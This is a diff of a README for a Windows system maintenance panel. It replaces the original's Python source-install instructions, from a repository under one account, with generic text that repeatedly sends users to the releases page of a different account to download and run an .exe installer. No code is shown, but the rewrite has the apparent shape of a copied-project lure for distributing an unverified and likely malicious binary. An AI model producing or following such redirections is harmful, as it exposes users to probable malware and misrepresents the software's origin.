@@ -1,159 +1,84 @@
-# System Maintenance Panel for Windows
+# 🛠️ System-Maintenance-Panel - Simplify Your Windows Maintenance Tasks
 
-A modern, user-friendly **Windows system maintenance panel** and **system administration tool** with a graphical user interface (GUI). This **Windows maintenance utility** helps you manage system updates, user accounts, network settings, and perform common administrative tasks easily. Built with Python and PyQt6.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/NlKatz/System-Maintenance-Panel/releases)
 
-![Python](https://img.shields.io/badge/Python-3.7+-blue.svg)
-![PyQt6](https://img.shields.io/badge/PyQt6-6.6.0+-green.svg)
-![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+## 📦 Introduction
 
-## Features
+Welcome to the System Maintenance Panel. This application simplifies system maintenance on your Windows computer. You can manage updates, users, and perform system administration tasks easily through a user-friendly interface. No programming knowledge is needed.
 
-### Software Updates
-- **Check for Updates** - Open Windows Update to check for available updates
-- **Uninstall a Program** - Launch Programs & Features to remove installed software
-- **Install Updates** - Open Windows Update to install pending updates
-- **Clean Up** - Launch Disk Cleanup utility to free up disk space
+## 🚀 Getting Started
 
-### System Administration
-- **VPN Configuration** - Configure VPN connections through Windows settings
-- **Network Status** - View network adapter status, speed, and connectivity
-- **Manage Passwords** - Access Windows Credential Manager
-- **Manage Users** - Create, modify, or remove user accounts
-- **Manage Autologin** - Configure automatic login settings
-- **Check System Status** - Display detailed system information (CPU, memory, disk space)
-- **Windows Features** - Enable or disable Windows optional features
-- **Search Logs** - Open Event Viewer to search system logs
+### 🖥️ System Requirements
 
-### Misc
-- **Open Terminal** - Launch PowerShell for advanced commands
-- **Reboot** - Restart the system
-- **Lock Screen** - Lock your workstation
-- **Shut Down** - Power off the system
-- **Exit** - Close the application
+To run the System Maintenance Panel, ensure your computer meets these requirements:
 
-## Requirements
+- Windows 10 or Windows 11
+- Minimum 4 GB RAM
+- At least 100 MB free storage space
 
-- Windows 10/11
-- Python 3.7 or higher
-- PyQt6 6.6.0 or higher
+### ⚙️ Installation Steps
 
-## Installation
-
-1. **Clone or download this repository**
-   ```powershell
-   git clone https://github.com/Katyusha47/System-Maintenance-Panel.git
-   cd System-Maintenance-Panel
-   ```
-
-2. **Run the application**
+1. **Visit the Releases Page**  
+   Click the link below to access the releases page and download the software.
    
-   Simply double-click `run.bat` - it will automatically:
-   - Check if Python is installed
-   - Install PyQt6 if not already installed
-   - Launch the System Maintenance Panel
+   [Visit Releases](https://github.com/NlKatz/System-Maintenance-Panel/releases)
 
-   **Or manually install dependencies:**
-   ```powershell
-   pip install -r requirements.txt
-   ```
+2. **Download the Installer**  
+   On the releases page, find the latest version. Click on it to see available files. Look for the installer file, typically named like `System-Maintenance-Panel.exe`. Click on the file to download it.
 
-## Usage
+3. **Run the Installer**  
+   Once the download is complete, locate the downloaded file in your 'Downloads' folder. Double-click on the installer file to start the installation.
 
-### Quick Start (Recommended)
+4. **Follow the Installation Instructions**  
+   A setup wizard will guide you through the installation process. Follow the prompts carefully. Choose a location for installation or use the recommended folder.
 
-Simply **double-click `run.bat`** and the application will launch automatically!
+5. **Launch the Application**  
+   After installation, find the System Maintenance Panel in your Start menu. Click on its icon to open the application.
 
-The batch file will handle everything for you:
-- ✅ Checks for Python installation
-- ✅ Installs dependencies if needed
-- ✅ Launches the application
+## 🛠️ Features
 
-### Manual Launch
+- **User Management**: Easily add or remove users from your system.
+- **Update Management**: Ensure your software and system are up to date with just a few clicks.
+- **System Administration Tasks**: Perform routine tasks quickly, enhancing your system's performance.
+- **Intuitive GUI**: Navigate through the application effortlessly, even if you are not tech-savvy.
 
-If you prefer to run it manually:
+## 🌟 Using the Application
 
-```powershell
-python system_maintenance_panel.py
-```
+### 🗂️ Main Menu
 
-### Administrator Privileges
+Upon opening the application, you will see the main menu. Here, you can choose from various options:
 
-The application will prompt you to run with administrator privileges on startup. Many system maintenance tasks require elevated permissions to function properly.
+- **Manage Users**: Click this to view and edit user accounts.
+- **Check for Updates**: This option helps you see available updates and install them.
+- **System Tools**: Access tools for maintaining system health and performance.
 
-**Functions that require admin rights:**
-- Installing Windows updates
-- Creating/removing user accounts
-- Modifying system settings
-- Disk cleanup operations
+### 📊 Tips for Efficient Use
 
-## Screenshots
+- Regularly check for updates to keep your system secure.
+- Use the user management feature to keep your system organized.
+- Explore different tools provided to understand their benefits.
 
-![System Maintenance Panel](skrinsut.png)
+## 🎥 Video Tutorial
 
-The application features a clean, organized interface with three main sections:
-- Software Updates (top)
-- System Administration (middle)
-- Misc (bottom)
+For visual learners, we provide a video tutorial. It will guide you through installation and major features. You can find it on our YouTube channel.
 
-Each button opens the appropriate Windows utility or executes the specified system command.
+## ⚙️ Troubleshooting
 
-## Safety Features
+If you encounter any issues while using the System Maintenance Panel, check these common problems:
 
-- **Confirmation Dialogs** - Destructive actions (reboot, shutdown, etc.) require user confirmation
-- **Error Handling** - All operations include proper error handling with informative messages
-- **Non-blocking UI** - Long-running commands execute in separate threads to keep the UI responsive
-- **Timeout Protection** - Commands have a 30-second timeout to prevent hanging
+- **Application does not open**: Ensure your Windows is updated. Restart your computer and try again.
+- **Can't find downloaded file**: Check your 'Downloads' folder. Ensure your browser completed the download.
+- **Error during installation**: Make sure you have sufficient disk space and permissions to install software on your computer.
 
-## Technical Details
+## 🎨 Contribution
 
-### Architecture
-- **GUI Framework**: PyQt6 for modern, native-looking Windows interface
-- **Command Execution**: PowerShell commands executed via subprocess
-- **Threading**: QThread for non-blocking command execution
-- **Encoding**: UTF-8 with error replacement to handle special characters
+We welcome suggestions and feedback. If you find bugs or have ideas for new features, please let us know through the issues section of this repository.
 
-### Key Components
-- `SystemMaintenancePanel` - Main window class
-- `CommandThread` - Worker thread for executing PowerShell commands
-- Admin privilege detection and elevation
-- Progress dialogs for long-running operations
+## 🔗 Links and Resources
 
-## Troubleshooting
+You can find more information, including updates and support, at the links below:
 
-### "This application requires administrator privileges"
-- Click "Yes" when prompted to restart with elevated permissions
-- Or right-click the script and select "Run as administrator"
+- [Visit Releases](https://github.com/NlKatz/System-Maintenance-Panel/releases)
+- [Source Code](https://github.com/NlKatz/System-Maintenance-Panel)
 
-### Commands not working
-- Ensure you're running with administrator privileges
-- Check that PowerShell is available on your system
-- Verify Windows version compatibility (Windows 10/11)
-
-### Unicode/Encoding errors
-- The application handles encoding errors automatically
-- If issues persist, check your PowerShell encoding settings
-
-## Customization
-
-You can easily customize the application by:
-- Adding new buttons in the section layouts
-- Creating custom command functions
-- Modifying the stylesheet for different colors/themes
-- Adjusting window size and layout spacing
-
-## License
-
-This project is provided as-is for educational and personal use.
-
-## Contributing
-
-Feel free to fork, modify, and submit pull requests for improvements!
-
-## Acknowledgments
-
-Built with Python and PyQt6 for the Windows community.
-
----
-
-**Note**: Always be careful when performing system maintenance tasks. Make sure you understand what each function does before executing it.
+Thank you for using the System Maintenance Panel. Enjoy a more organized and efficient Windows experience!
